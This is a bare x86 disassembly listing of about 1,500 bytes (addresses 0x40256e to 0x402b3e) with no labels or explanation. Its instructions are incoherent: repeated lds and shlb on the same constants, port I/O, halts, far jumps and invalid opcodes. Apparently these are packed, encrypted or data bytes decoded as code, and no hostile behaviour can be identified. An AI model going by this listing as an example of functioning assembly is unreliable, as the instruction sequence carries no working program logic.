  40256e:	a0 eb 60 5f c5       	mov    0xc55f60eb,%al
  402573:	48                   	dec    %eax
  402574:	d0 a1 a0 eb 60 5f    	shlb   $1,0x5f60eba0(%ecx)
  40257a:	c5 44 d0 a1          	lds    -0x5f(%eax,%edx,8),%eax
  40257e:	a0 eb 60 5f c5       	mov    0xc55f60eb,%al
  402583:	40                   	inc    %eax
  402584:	d0 a1 a0 eb 60 5f    	shlb   $1,0x5f60eba0(%ecx)
  40258a:	c5 3c d0             	lds    (%eax,%edx,8),%edi
  40258d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  402592:	c5 38                	lds    (%eax),%edi
  402594:	d0 a1 a0 eb 60 5f    	shlb   $1,0x5f60eba0(%ecx)
  40259a:	c5 34 d0             	lds    (%eax,%edx,8),%esi
  40259d:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  4025a2:	c5 30                	lds    (%eax),%esi
  4025a4:	d0 a1 a0 eb 60 5f    	shlb   $1,0x5f60eba0(%ecx)
  4025aa:	c5 2c d0             	lds    (%eax,%edx,8),%ebp
  4025ad:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  4025b2:	c5 28                	lds    (%eax),%ebp
  4025b4:	d0 a1 a0 eb 60 5f    	shlb   $1,0x5f60eba0(%ecx)
  4025ba:	c5 94 d1 a1 a0 eb 60 	lds    0x60eba0a1(%ecx,%edx,8),%edx
  4025c1:	5f                   	pop    %edi
  4025c2:	c5 24 d0             	lds    (%eax,%edx,8),%esp
  4025c5:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  4025ca:	c5 20                	lds    (%eax),%esp
  4025cc:	d0 a1 a0 eb 60 5f    	shlb   $1,0x5f60eba0(%ecx)
  4025d2:	c5 1c d0             	lds    (%eax,%edx,8),%ebx
  4025d5:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  4025da:	c5 18                	lds    (%eax),%ebx
  4025dc:	d0 a1 a0 eb 60 5f    	shlb   $1,0x5f60eba0(%ecx)
  4025e2:	c5 a0 d1 a1 a0 eb    	lds    -0x145f5e2f(%eax),%esp
  4025e8:	60                   	pusha
  4025e9:	5f                   	pop    %edi
  4025ea:	c5 9c d1 a1 a0 eb 60 	lds    0x60eba0a1(%ecx,%edx,8),%ebx
  4025f1:	5f                   	pop    %edi
  4025f2:	c5 14 d0             	lds    (%eax,%edx,8),%edx
  4025f5:	a1 a0 eb 60 b0       	mov    0xb060eba0,%eax
  4025fa:	41                   	inc    %ecx
  4025fb:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4025fc:	40                   	inc    %eax
  4025fd:	a0 a0 b0 41 f4       	mov    0xf441b0a0,%al
  402602:	55                   	push   %ebp
  402603:	a0 a0 b0 88 46       	mov    0x4688b0a0,%al
  402608:	9e                   	sahf
  402609:	5f                   	pop    %edi
  40260a:	9f                   	lahf
  40260b:	23 30                	and    (%eax),%esi
  40260d:	b3 2b                	mov    $0x2b,%bl
  40260f:	38 f3                	cmp    %dh,%bl
  402611:	01 e4                	add    %esp,%esp
  402613:	00 e0                	add    %ah,%al
  402615:	60                   	pusha
  402616:	23 40 a1             	and    -0x5f(%eax),%eax
  402619:	b0 41                	mov    $0x41,%al
  40261b:	f4                   	hlt
  40261c:	55                   	push   %ebp
  40261d:	a0 a0 b0 88 3c       	mov    0x3c88b0a0,%al
  402622:	9e                   	sahf
  402623:	5f                   	pop    %edi
  402624:	9f                   	lahf
  402625:	e3 98                	jecxz  0x4025bf
  402627:	61                   	popa
  402628:	bb 20 97 38 23       	mov    $0x23389720,%ebx
  40262d:	40                   	inc    %eax
  40262e:	1f                   	pop    %ds
  40262f:	bb 63 b2 f0 01       	mov    $0x1f0b263,%ebx
  402634:	e4 00                	in     $0x0,%al
  402636:	e0 60                	loopne 0x402698
  402638:	23 40 a0             	and    -0x60(%eax),%eax
  40263b:	b0 41                	mov    $0x41,%al
  40263d:	f4                   	hlt
  40263e:	55                   	push   %ebp
  40263f:	a0 a0 b0 88 12       	mov    0x1288b0a0,%al
  402644:	9e                   	sahf
  402645:	5f                   	pop    %edi
  402646:	9f                   	lahf
  402647:	23 30                	and    (%eax),%esi
  402649:	e5 60                	in     $0x60,%eax
  40264b:	d4 aa                	aam    $0xaa
  40264d:	5f                   	pop    %edi
  40264e:	b5 a8                	mov    $0xa8,%ch
  402650:	40                   	inc    %eax
  402651:	a0 a0 69 60 d4       	mov    0xd46069a0,%al
  402656:	a1 23 50 61 89       	mov    0x89615023,%eax
  40265b:	22 a0 60 a0 23 30    	and    0x3023a060(%eax),%ah
  402661:	e5 60                	in     $0x60,%eax
  402663:	d4 aa                	aam    $0xaa
  402665:	5f                   	pop    %edi
  402666:	b5 ac                	mov    $0xac,%ch
  402668:	40                   	inc    %eax
  402669:	a0 a0 69 60 d5       	mov    0xd56069a0,%al
  40266e:	a1 23 50 62 89       	mov    0x89625023,%eax
  402673:	0a a0 60 a0 23 30    	or     0x3023a060(%eax),%ah
  402679:	eb a8                	jmp    0x402623
  40267b:	e5 69                	in     $0x69,%eax
  40267d:	d4 d2                	aam    $0xd2
  40267f:	e5 72                	in     $0x72,%eax
  402681:	d4 b8                	aam    $0xb8
  402683:	b0 29                	mov    $0x29,%al
  402685:	28 9f 75 f0 00 e0    	sub    %bl,-0x1fff0f8b(%edi)
  40268b:	60                   	pusha
  40268c:	f9                   	stc
  40268d:	69 60 d4 b9 e9 a1 23 	imul   $0x23a1e9b9,-0x2c(%eax),%esp
  402694:	50                   	push   %eax
  402695:	62 89 e6 a0 60 a0    	bound  %ecx,-0x5f9f5f1a(%ecx)
  40269b:	e9 b0 e9 68 5f       	jmp    0x5fa91050
  4026a0:	b5 ac                	mov    $0xac,%ch
  4026a2:	40                   	inc    %eax
  4026a3:	a0 a0 69 60 d5       	mov    0xd56069a0,%al
  4026a8:	8b 23                	mov    (%ebx),%esp
  4026aa:	50                   	push   %eax
  4026ab:	61                   	popa
  4026ac:	89 d0                	mov    %edx,%eax
  4026ae:	a0 60 a0 e5 72       	mov    0x72e5a060,%al
  4026b3:	d4 b0                	aam    $0xb0
  4026b5:	b0 29                	mov    $0x29,%al
  4026b7:	30 9f 75 e8 00 e0    	xor    %bl,-0x1fff178b(%edi)
  4026bd:	60                   	pusha
  4026be:	f9                   	stc
  4026bf:	69 60 d4 87 e9 a1 23 	imul   $0x23a1e987,-0x2c(%eax),%esp
  4026c6:	2d a0 a0 e9 b5       	sub    $0xb5e9a0a0,%eax
  4026cb:	64 40                	fs inc %eax
  4026cd:	a0 a0 48 2d 72       	mov    0x722d48a0,%al
  4026d2:	a0 60 63 b3 f6       	mov    0xf6b36360,%al
  4026d7:	eb 92                	jmp    0x40266b
  4026d9:	eb 78                	jmp    0x402753
  4026db:	e0 83                	loopne 0x402660
  4026dd:	df 23                	fbld   (%ebx)
  4026df:	9d                   	popf
  4026e0:	a8 10                	test   $0x10,%al
  4026e2:	e0 60                	loopne 0x402744
  4026e4:	a0 d4 aa eb 76       	mov    0x76ebaad4,%al
  4026e9:	eb 63                	jmp    0x40274e
  4026eb:	5f                   	pop    %edi
  4026ec:	b5 68                	mov    $0x68,%ch
  4026ee:	50                   	push   %eax
  4026ef:	a0 a0 e4 7b d5       	mov    0xd57be4a0,%al
  4026f4:	ad                   	lods   %ds:(%esi),%eax
  4026f5:	48                   	dec    %eax
  4026f6:	ef                   	out    %eax,(%dx)
  4026f7:	80 a0 60 2b f8 a4 60 	andb   $0x60,-0x5b07d4a0(%eax)
  4026fe:	a0 60 8b 6f 20       	mov    0x206f8b60,%al
  402703:	5b                   	pop    %ebx
  402704:	b8 d7 aa 93 60       	mov    $0x6093aad7,%eax
  402709:	ea 63 ea 38 b4 40 a0 	ljmp   $0xa040,$0xb438ea63
  402710:	a0 93 60 ea 63       	mov    0x63ea6093,%al
  402715:	eb 76                	jmp    0x40278d
  402717:	48                   	dec    %eax
  402718:	4d                   	dec    %ebp
  402719:	5f                   	pop    %edi
  40271a:	9f                   	lahf
  40271b:	5f                   	pop    %edi
  40271c:	fe                   	(bad)
  40271d:	bb 63 eb 60 e3       	mov    $0xe360eb63,%ebx
  402722:	80 df 2b             	sbb    $0x2b,%bh
  402725:	74 c4                	je     0x4026eb
  402727:	49                   	dec    %ecx
  402728:	49                   	dec    %ecx
  402729:	5f                   	pop    %edi
  40272a:	9f                   	lahf
  40272b:	5f                   	pop    %edi
  40272c:	63 b3 2b 38 88 74    	arpl   %esi,0x7488382b(%ebx)
  402732:	c0 60 a0 e9          	shlb   $0xe9,-0x60(%eax)
  402736:	38 64 a0 60          	cmp    %ah,0x60(%eax,%eiz,4)
  40273a:	a0 bb 63 48 2f       	mov    0x2f4863bb,%al
  40273f:	5e                   	pop    %esi
  402740:	9f                   	lahf
  402741:	5f                   	pop    %edi
  402742:	88 46 9f             	mov    %al,-0x61(%esi)
  402745:	5f                   	pop    %edi
  402746:	9f                   	lahf
  402747:	23 30                	and    (%eax),%esi
  402749:	b3 88                	mov    $0x88,%bl
  40274b:	5a                   	pop    %edx
  40274c:	bf 60 a0 eb 38       	mov    $0x38eba060,%edi
  402751:	64 a0 60 a0 48 8f    	mov    %fs:0x8f48a060,%al
  402757:	7f a0                	jg     0x4026f9
  402759:	60                   	pusha
  40275a:	d3 32                	shll   %cl,(%edx)
  40275c:	29 f0                	sub    %esi,%eax
  40275e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40275f:	60                   	pusha
  402760:	a0 60 2b 23 fb       	mov    0xfb232b60,%al
  402765:	23 2d a0 a0 b3 2b    	and    0x2bb3a0a0,%ebp
  40276b:	38 2b                	cmp    %ch,(%ebx)
  40276d:	23 88 de b5 60 a0    	and    -0x5f9f4a22(%eax),%ecx
  402773:	48                   	dec    %eax
  402774:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402775:	60                   	pusha
  402776:	a0 60 fb 23 2d       	mov    0x2d23fb60,%al
  40277b:	a0 a0 b3 2b 38       	mov    0x382bb3a0,%al
  402780:	0a 60 f3             	or     -0xd(%eax),%ah
  402783:	48                   	dec    %eax
  402784:	e1 5e                	loope  0x4027e4
  402786:	9f                   	lahf
  402787:	5f                   	pop    %edi
  402788:	06                   	push   %es
  402789:	e5 60                	in     $0x60,%eax
  40278b:	d5 a5                	aad    $0xa5
  40278d:	48                   	dec    %eax
  40278e:	4b                   	dec    %ebx
  40278f:	5f                   	pop    %edi
  402790:	9f                   	lahf
  402791:	5f                   	pop    %edi
  402792:	fb                   	sti
  402793:	23 30                	and    (%eax),%esi
  402795:	e3 99                	jecxz  0x402730
  402797:	64 1d 7c 07 43 f7    	fs sbb $0xf743077c,%eax
  40279d:	99                   	cltd
  40279e:	70 d4                	jo     0x402774
  4027a0:	f3 b6 f7             	repz mov $0xf7,%dh
  4027a3:	e9 66 e9 77 d7       	jmp    0xd7b8110e
  4027a8:	a9 ed 14 91 9f       	test   $0x9f9114ed,%eax
  4027ad:	ed                   	in     (%dx),%eax
  4027ae:	1c 99                	sbb    $0x99,%al
  4027b0:	9f                   	lahf
  4027b1:	5d                   	pop    %ebp
  4027b2:	93                   	xchg   %eax,%ebx
  4027b3:	04 8b                	add    $0x8b,%al
  4027b5:	8c d9                	mov    %ds,%ecx
  4027b7:	30 14 9a             	xor    %dl,(%edx,%ebx,4)
  4027ba:	f6 b7 29 26 29 37    	divb   0x37292629(%edi)
  4027c0:	29 28                	sub    %ebp,(%eax)
  4027c2:	17                   	pop    %ss
  4027c3:	80 23 41             	andb   $0x41,(%ebx)
  4027c6:	a3 ed 14 90 9f       	mov    %eax,0x9f9014ed
  4027cb:	ed                   	in     (%dx),%eax
  4027cc:	1c 98                	sbb    $0x98,%al
  4027ce:	9f                   	lahf
  4027cf:	5d                   	pop    %ebp
  4027d0:	93                   	xchg   %eax,%ebx
  4027d1:	04 61                	add    $0x61,%al
  4027d3:	58                   	pop    %eax
  4027d4:	a2 e9 61 18 a3       	mov    %al,0xa31861e9
  4027d9:	60                   	pusha
  4027da:	a0 60 c9 26 c9       	mov    0xc926c960,%al
  4027df:	27                   	daa
  4027e0:	93                   	xchg   %eax,%ebx
  4027e1:	05 9c a9 61 59       	add    $0x5961a99c,%eax
  4027e6:	a2 d8 a9 53 45       	mov    %al,0x4553a9d8
  4027eb:	e3 80                	jecxz  0x40276d
  4027ed:	63 29                	arpl   %ebp,(%ecx)
  4027ef:	21 93 04 ff be 63    	and    %edx,0x63beff04(%ebx)
  4027f5:	b3 f6                	mov    $0xf6,%bl
  4027f7:	b7 f5                	mov    $0xf5,%bh
  4027f9:	eb 92                	jmp    0x40278d
  4027fb:	eb 78                	jmp    0x402875
  4027fd:	4b                   	dec    %ebx
  4027fe:	a8 b3                	test   $0xb3,%al
  402800:	88 14 9d 5f 9f eb 78 	mov    %dl,0x78eb9f5f(,%ebx,4)
  402807:	ea a3 e4 60 d4 a4 9c 	ljmp   $0x9ca4,$0xd460e4a3
  40280e:	c0 d6 8e             	rcl    $0x8e,%dh
  402811:	e0 db                	loopne 0x4027ee
  402813:	82 15 6b 20 db a1 82 	adcb   $0x82,0xa1db206b
  40281a:	15 65 23 23 a2       	adc    $0xa2232365,%eax
  40281f:	4b                   	dec    %ebx
  402820:	86 93 8d eb 9b 4b    	xchg   %dl,0x4b9beb8d(%ebx)
  402826:	e3 9c                	jecxz  0x4027c4
  402828:	c2 d5 d1             	ret    $0xd1d5
  40282b:	b3 88                	mov    $0x88,%bl
  40282d:	e8 9d 5f 9f eb       	call   0xebdf87cf
  402832:	78 4b                	js     0x40287f
  402834:	ae                   	scas   %es:(%edi),%al
  402835:	b3 88                	mov    $0x88,%bl
  402837:	de 9d 5f 9f eb 70    	ficomps 0x70eb9f5f(%ebp)
  40283d:	8b 73 63             	mov    0x63(%ebx),%esi
  402840:	8a eb                	mov    %bl,%ch
  402842:	78 ea                	js     0x40282e
  402844:	a3 e4 60 d4 a4       	mov    %eax,0xa4d460e4
  402849:	9c                   	pushf
  40284a:	c2 d5 88             	ret    $0x88d5
  40284d:	e0 db                	loopne 0x40282a
  40284f:	60                   	pusha
  402850:	14 78                	adc    $0x78,%al
  402852:	f3 48                	repz dec %eax
  402854:	01 5d 9f             	add    %ebx,-0x61(%ebp)
  402857:	5f                   	pop    %edi
  402858:	2b 38                	sub    (%eax),%edi
  40285a:	8b 6e f3             	mov    -0xd(%esi),%ebp
  40285d:	48                   	dec    %eax
  40285e:	f7 5d 9f             	negl   -0x61(%ebp)
  402861:	5f                   	pop    %edi
  402862:	2b 30                	sub    (%eax),%esi
  402864:	cb                   	lret
  402865:	33 a3 4a 2b 38 2a    	xor    0x2a382b4a(%ebx),%esp
  40286b:	63 dc                	arpl   %ebx,%esp
  40286d:	80 17 17             	adcb   $0x17,(%edi)
  402870:	2b 26                	sub    (%esi),%esp
  402872:	2b 35 88 04 b5 60    	sub    0x60b50488,%esi
  402878:	a0 eb 7f eb de       	mov    0xdeeb7feb,%al
  40287d:	93                   	xchg   %eax,%ebx
  40287e:	96                   	xchg   %eax,%esi
  40287f:	4b                   	dec    %ebx
  402880:	f1                   	int1
  402881:	9c                   	pushf
  402882:	c2 d5 d8             	ret    $0xd8d5
  402885:	b3 88                	mov    $0x88,%bl
  402887:	8e 9d 5f 9f eb 78    	mov    0x78eb9f5f(%ebp),%ds
  40288d:	4b                   	dec    %ebx
  40288e:	b5 b3                	mov    $0xb3,%ch
  402890:	88 84 9d 5f 9f 9b 63 	mov    %al,0x639b9f5f(%ebp,%ebx,4)
  402897:	d6                   	salc
  402898:	ab                   	stos   %eax,%es:(%edi)
  402899:	ea b3 e8 b4 97 e3 a6 	ljmp   $0xa6e3,$0x97b4e8b3
  4028a0:	db 23                	(bad) (%ebx)
  4028a2:	17                   	pop    %ss
  4028a3:	55                   	push   %ebp
  4028a4:	2a 63 24             	sub    0x24(%ebx),%ah
  4028a7:	20 14 64             	and    %dl,(%esp,%eiz,2)
  4028aa:	dc 82 15 41 20 9b    	faddl  -0x64dfbeeb(%edx)
  4028b0:	a0 d4 bf b3 88       	mov    0x88b3bfd4,%al
  4028b5:	60                   	pusha
  4028b6:	9d                   	popf
  4028b7:	5f                   	pop    %edi
  4028b8:	9f                   	lahf
  4028b9:	eb 78                	jmp    0x402933
  4028bb:	4b                   	dec    %ebx
  4028bc:	b5 b3                	mov    $0xb3,%ch
  4028be:	88 56 9c             	mov    %dl,-0x64(%esi)
  4028c1:	5f                   	pop    %edi
  4028c2:	9f                   	lahf
  4028c3:	9b                   	fwait
  4028c4:	63 d6                	arpl   %edx,%esi
  4028c6:	ab                   	stos   %eax,%es:(%edi)
  4028c7:	ea b3 e8 b4 97 e3 a6 	ljmp   $0xa6e3,$0x97b4e8b3
  4028ce:	db 23                	(bad) (%ebx)
  4028d0:	17                   	pop    %ss
  4028d1:	55                   	push   %ebp
  4028d2:	2a 63 dc             	sub    -0x24(%ebx),%ah
  4028d5:	80 17 09             	adcb   $0x9,(%edi)
  4028d8:	2b 23                	sub    (%ebx),%esp
  4028da:	fd                   	std
  4028db:	bf fe bb 63 eb       	mov    $0xeb63bbfe,%edi
  4028e0:	60                   	pusha
  4028e1:	b5 2b                	mov    $0x2b,%ch
  4028e3:	4c                   	dec    %esp
  4028e4:	0a 60 f3             	or     -0xd(%eax),%ah
  4028e7:	b6 d3                	mov    $0xd3,%dh
  4028e9:	20 f5                	and    %dh,%ch
  4028eb:	c8 49 74 e0          	enter  $0x7449,$0xe0
  4028ef:	60                   	pusha
  4028f0:	04 5f                	add    $0x5f,%al
  4028f2:	d0 c4                	rol    $1,%ah
  4028f4:	29 80 d3 56 88 ac    	sub    %eax,-0x5377a92d(%eax)
  4028fa:	9c                   	pushf
  4028fb:	5f                   	pop    %edi
  4028fc:	9f                   	lahf
  4028fd:	ed                   	in     (%dx),%eax
  4028fe:	f5                   	cmc
  4028ff:	5c                   	pop    %esp
  402900:	88 50 9e             	mov    %dl,-0x62(%eax)
  402903:	5f                   	pop    %edi
  402904:	9f                   	lahf
  402905:	eb 78                	jmp    0x40297f
  402907:	ed                   	in     (%dx),%eax
  402908:	f5                   	cmc
  402909:	5c                   	pop    %esp
  40290a:	2b 23                	sub    (%ebx),%esp
  40290c:	88 44 9e 5f          	mov    %al,0x5f(%esi,%ebx,4)
  402910:	9f                   	lahf
  402911:	eb 78                	jmp    0x40298b
  402913:	e3 1d                	jecxz  0x402932
  402915:	5c                   	pop    %esp
  402916:	a0 d4 a3 a6 8b       	mov    0x8ba6a3d4,%al
  40291b:	4b                   	dec    %ebx
  40291c:	d3 20                	shll   %cl,(%eax)
  40291e:	fa                   	cli
  40291f:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  402924:	08 10                	or     %dl,(%eax)
  402926:	b4 a0                	mov    $0xa0,%ah
  402928:	a0 ed e5 5c 88       	mov    0x885ce5ed,%al
  40292d:	a8 b0                	test   $0xb0,%al
  40292f:	60                   	pusha
  402930:	a0 23 89 e6 ab       	mov    0xabe68923,%al
  402935:	60                   	pusha
  402936:	a0 4b 90 eb 66       	mov    0x66eb904b,%al
  40293b:	be fb b9 fd 23       	mov    $0x23fdb9fb,%esi
  402940:	30 b3 f6 b7 21 24    	xor    %dh,0x2421b7f6(%ebx)
  402946:	98                   	cwtl
  402947:	5e                   	pop    %esi
  402948:	9f                   	lahf
  402949:	5f                   	pop    %edi
  40294a:	2b 3a                	sub    (%edx),%edi
  40294c:	2b 50 2b             	sub    0x2b(%eax),%edx
  40294f:	23 88 84 b0 60 a0    	and    -0x5f9f4f7c(%eax),%ecx
  402955:	e5 96                	in     $0x96,%eax
  402957:	d5 be                	aad    $0xbe
  402959:	c8 a5 61 a0          	enter  $0x61a5,$0xa0
  40295d:	60                   	pusha
  40295e:	2d a4 c4 64 f0       	sub    $0xf064c4a4,%eax
  402963:	ca a0 48             	lret   $0x48a0
  402966:	47                   	inc    %edi
  402967:	5b                   	pop    %ebx
  402968:	9f                   	lahf
  402969:	5f                   	pop    %edi
  40296a:	2b 28                	sub    (%eax),%ebp
  40296c:	2b 34 2b             	sub    (%ebx,%ebp,1),%esi
  40296f:	23 88 50 b0 60 a0    	and    -0x5f9f4fb0(%eax),%ecx
  402975:	4b                   	dec    %ebx
  402976:	be 48 6d 5b 9f       	mov    $0x9f5b6d48,%esi
  40297b:	5f                   	pop    %edi
  40297c:	2b 58 2b             	sub    0x2b(%eax),%ebx
  40297f:	33 2b                	xor    (%ebx),%ebp
  402981:	27                   	daa
  402982:	88 ce                	mov    %cl,%dh
  402984:	9e                   	sahf
  402985:	5f                   	pop    %edi
  402986:	9f                   	lahf
  402987:	eb 98                	jmp    0x402921
  402989:	e5 96                	in     $0x96,%eax
  40298b:	d4 a8                	aam    $0xa8
  40298d:	e3 db                	jecxz  0x40296a
  40298f:	60                   	pusha
  402990:	14 63                	adc    $0x63,%al
  402992:	ee                   	out    %al,(%dx)
  402993:	4b                   	dec    %ebx
  402994:	89 e1                	mov    %esp,%ecx
  402996:	64 68 a1 60 a0 bf    	fs push $0xbfa060a1
  40299c:	fe                   	(bad)
  40299d:	bb 63 eb 60 b5       	mov    $0xb560eb63,%ebx
  4029a2:	2b 4c 23 24          	sub    0x24(%ebx,%eiz,1),%ecx
  4029a6:	88 ed                	mov    %ch,%ch
  4029a8:	e5 48                	in     $0x48,%eax
  4029aa:	f0 48                	lock dec %eax
  4029ac:	59                   	pop    %ecx
  4029ad:	5b                   	pop    %ebx
  4029ae:	9f                   	lahf
  4029af:	5f                   	pop    %edi
  4029b0:	af                   	scas   %es:(%edi),%eax
  4029b1:	17                   	pop    %ss
  4029b2:	e5 50                	in     $0x50,%eax
  4029b4:	0b 20                	or     (%eax),%esp
  4029b6:	dc c6                	fadd   %st,%st(6)
  4029b8:	a3 a5 92 cb 60       	mov    %eax,0x60cb92a5
  4029bd:	9c                   	pushf
  4029be:	d1 32                	shll   $1,(%edx)
  4029c0:	06                   	push   %es
  4029c1:	eb f5                	jmp    0x4029b8
  4029c3:	54                   	push   %esp
  4029c4:	a1 30 09 20 88       	mov    0x88200930,%eax
  4029c9:	63 a0 60 06 eb f5    	arpl   %esp,-0xa14f9a0(%eax)
  4029cf:	56                   	push   %esi
  4029d0:	a1 30 43 68 40       	mov    0x40684330,%eax
  4029d5:	a0 a0 eb 85 bd       	mov    0xbd85eba0,%al
  4029da:	63 eb                	arpl   %ebp,%ebx
  4029dc:	60                   	pusha
  4029dd:	b3 2b                	mov    $0x2b,%bl
  4029df:	38 2b                	cmp    %ch,(%ebx)
  4029e1:	23 88 6a b3 60 a0    	and    -0x5f9f4c96(%eax),%ecx
  4029e7:	48                   	dec    %eax
  4029e8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4029e9:	60                   	pusha
  4029ea:	a0 60 fb 23 2d       	mov    0x2d23fb60,%al
  4029ef:	a0 a0 b3 2b 38       	mov    0x382bb3a0,%al
  4029f4:	f3 48                	repz dec %eax
  4029f6:	7f 5b                	jg     0x402a53
  4029f8:	9f                   	lahf
  4029f9:	5f                   	pop    %edi
  4029fa:	06                   	push   %es
  4029fb:	e5 60                	in     $0x60,%eax
  4029fd:	d5 a5                	aad    $0xa5
  4029ff:	48                   	dec    %eax
  402a00:	d9 5d 9f             	fstps  -0x61(%ebp)
  402a03:	5f                   	pop    %edi
  402a04:	fb                   	sti
  402a05:	23 2d a0 a0 b3 2b    	and    0x2bb3a0a0,%ebp
  402a0b:	38 d3                	cmp    %dl,%bl
  402a0d:	20 29                	and    %ch,(%ecx)
  402a0f:	a3 b0 93 60 e9       	mov    %eax,0xe96093b0
  402a14:	e3 6c                	jecxz  0x402a82
  402a16:	0a 60 2d             	or     0x2d(%eax),%ah
  402a19:	a3 b0 b0 2b a3       	mov    %eax,0xa32bb0b0
  402a1e:	a8 b0                	test   $0xb0,%al
  402a20:	2b a3 b4 b0 2b 63    	sub    0x632bb0b4(%ebx),%esp
  402a26:	f0 48                	lock dec %eax
  402a28:	fd                   	std
  402a29:	5b                   	pop    %ebx
  402a2a:	9f                   	lahf
  402a2b:	5f                   	pop    %edi
  402a2c:	25 20 15 6e 88       	and    $0x886e1520,%eax
  402a31:	fc                   	cld
  402a32:	9b                   	fwait
  402a33:	5f                   	pop    %edi
  402a34:	9f                   	lahf
  402a35:	e3 98                	jecxz  0x4029cf
  402a37:	cd 15                	int    $0x15
  402a39:	66 d3 20             	shlw   %cl,(%eax)
  402a3c:	fb                   	sti
  402a3d:	23 d3                	and    %ebx,%edx
  402a3f:	20 fb                	and    %bh,%bl
  402a41:	23 2d a0 a0 93 60    	and    0x6093a0a0,%ebp
  402a47:	23 30                	and    (%eax),%esi
  402a49:	b3 f6                	mov    $0xf6,%bl
  402a4b:	b1 2b                	mov    $0x2b,%cl
  402a4d:	38 2b                	cmp    %ch,(%ebx)
  402a4f:	d3 ac e5 96 d5 a4 93 	shrl   %cl,-0x6c5b2a6a(%ebp,%eiz,8)
  402a56:	60                   	pusha
  402a57:	4b                   	dec    %ebx
  402a58:	c6                   	(bad)
  402a59:	ca a0 ed             	lret   $0xeda0
  402a5c:	e4 84                	in     $0x84,%al
  402a5e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402a5f:	b0 f6                	mov    $0xf6,%al
  402a61:	eb e3                	jmp    0x402a46
  402a63:	74 f0                	je     0x402a55
  402a65:	eb a3                	jmp    0x402a0a
  402a67:	b0 88                	mov    $0x88,%al
  402a69:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402a6a:	9b                   	fwait
  402a6b:	5f                   	pop    %edi
  402a6c:	9f                   	lahf
  402a6d:	e5 60                	in     $0x60,%eax
  402a6f:	d5 a7                	aad    $0xa7
  402a71:	48                   	dec    %eax
  402a72:	fb                   	sti
  402a73:	5b                   	pop    %ebx
  402a74:	9f                   	lahf
  402a75:	5f                   	pop    %edi
  402a76:	8b 62 d3             	mov    -0x2d(%edx),%esp
  402a79:	20 d3                	and    %dl,%bl
  402a7b:	32 29                	xor    (%ecx),%ch
  402a7d:	b3 ac                	mov    $0xac,%bl
  402a7f:	ba fe bb 63 eb       	mov    $0xeb63bbfe,%edx
  402a84:	60                   	pusha
  402a85:	b3 2b                	mov    $0x2b,%bl
  402a87:	38 f3                	cmp    %dh,%bl
  402a89:	48                   	dec    %eax
  402a8a:	63 5a 9f             	arpl   %ebx,-0x61(%edx)
  402a8d:	5f                   	pop    %edi
  402a8e:	e8 6f 34 20 fb       	call   0xfb605f02
  402a93:	23 30                	and    (%eax),%esi
  402a95:	b3 2b                	mov    $0x2b,%bl
  402a97:	38 06                	cmp    %al,(%esi)
  402a99:	27                   	daa
  402a9a:	e3 64                	jecxz  0x402b00
  402a9c:	50                   	push   %eax
  402a9d:	37                   	aaa
  402a9e:	2b 63 88             	sub    -0x78(%ebx),%esp
  402aa1:	40                   	inc    %eax
  402aa2:	9f                   	lahf
  402aa3:	5f                   	pop    %edi
  402aa4:	9f                   	lahf
  402aa5:	e4 60                	in     $0x60,%al
  402aa7:	d5 a7                	aad    $0xa7
  402aa9:	48                   	dec    %eax
  402aaa:	c3                   	ret
  402aab:	5b                   	pop    %ebx
  402aac:	9f                   	lahf
  402aad:	5f                   	pop    %edi
  402aae:	fb                   	sti
  402aaf:	23 d3                	and    %ebx,%edx
  402ab1:	20 fb                	and    %bh,%bl
  402ab3:	23 30                	and    (%eax),%esi
  402ab5:	b6 29                	mov    $0x29,%dh
  402ab7:	26 d1 20             	shll   $1,%es:(%eax)
  402aba:	29 a6 ac e9 e6 70    	sub    %esp,0x70e6e9ac(%esi)
  402ac0:	06                   	push   %es
  402ac1:	eb e6                	jmp    0x402aa9
  402ac3:	64 cd 11             	fs int $0x11
  402ac6:	77 60                	ja     0x402b28
  402ac8:	a0 d4 ab a8 14       	mov    0x14a8abd4,%al
  402acd:	80 e8 d4             	sub    $0xd4,%al
  402ad0:	ce                   	into
  402ad1:	49                   	dec    %ecx
  402ad2:	07                   	pop    %es
  402ad3:	61                   	popa
  402ad4:	a0 60 58 60 a0       	mov    0xa0605860,%al
  402ad9:	60                   	pusha
  402ada:	20 1a                	and    %bl,(%edx)
  402adc:	a1 60 a0 60 59       	mov    0x5960a060,%eax
  402ae1:	63 a0 60 a0 27 e6    	arpl   %esp,-0x19d85fa0(%eax)
  402ae7:	7c 20                	jl     0x402b09
  402ae9:	75 e0                	jne    0x402acb
  402aeb:	60                   	pusha
  402aec:	8b 87 58 60 a0 60    	mov    0x60a06058(%edi),%eax
  402af2:	e0 1a                	loopne 0x402b0e
  402af4:	a1 60 a0 60 59       	mov    0x5960a060,%eax
  402af9:	62 a0 60 a0 4b af    	bound  %esp,-0x50b45fa0(%eax)
  402aff:	18 a0 60 a0 20 5a    	sbb    %ah,0x5a20a060(%eax)
  402b05:	61                   	popa
  402b06:	a0 60 a0 19 a3       	mov    0xa319a060,%al
  402b0b:	60                   	pusha
  402b0c:	a0 60 67 a6 bc       	mov    0xbca66760,%al
  402b11:	20 b5 a0 a0 27 e6    	and    %dh,-0x19d85f60(%ebp)
  402b17:	84 ac 76 e0 60 67 a6 	test   %ch,-0x59989f20(%esi,%esi,2)
  402b1e:	c0 1c b5 a0 a0 e0 1e 	rcrb   $0xa8,0x1ee0a0a0(,%esi,4)
  402b25:	a8 
  402b26:	a0 6f 24 12 a0       	mov    0xa012246f,%al
  402b2b:	60                   	pusha
  402b2c:	a0 ca a0 c8 20       	mov    0x20c8a0ca,%al
  402b31:	60                   	pusha
  402b32:	a0 60 f1 ca a0       	mov    0xa0caf160,%al
  402b37:	b2 f0                	mov    $0xf0,%dl
  402b39:	ed                   	in     (%dx),%eax
  402b3a:	e6 a8                	out    %al,$0xa8
  402b3c:	f0 48                	lock dec %eax
  402b3e:	b7 5a                	mov    $0x5a,%bh
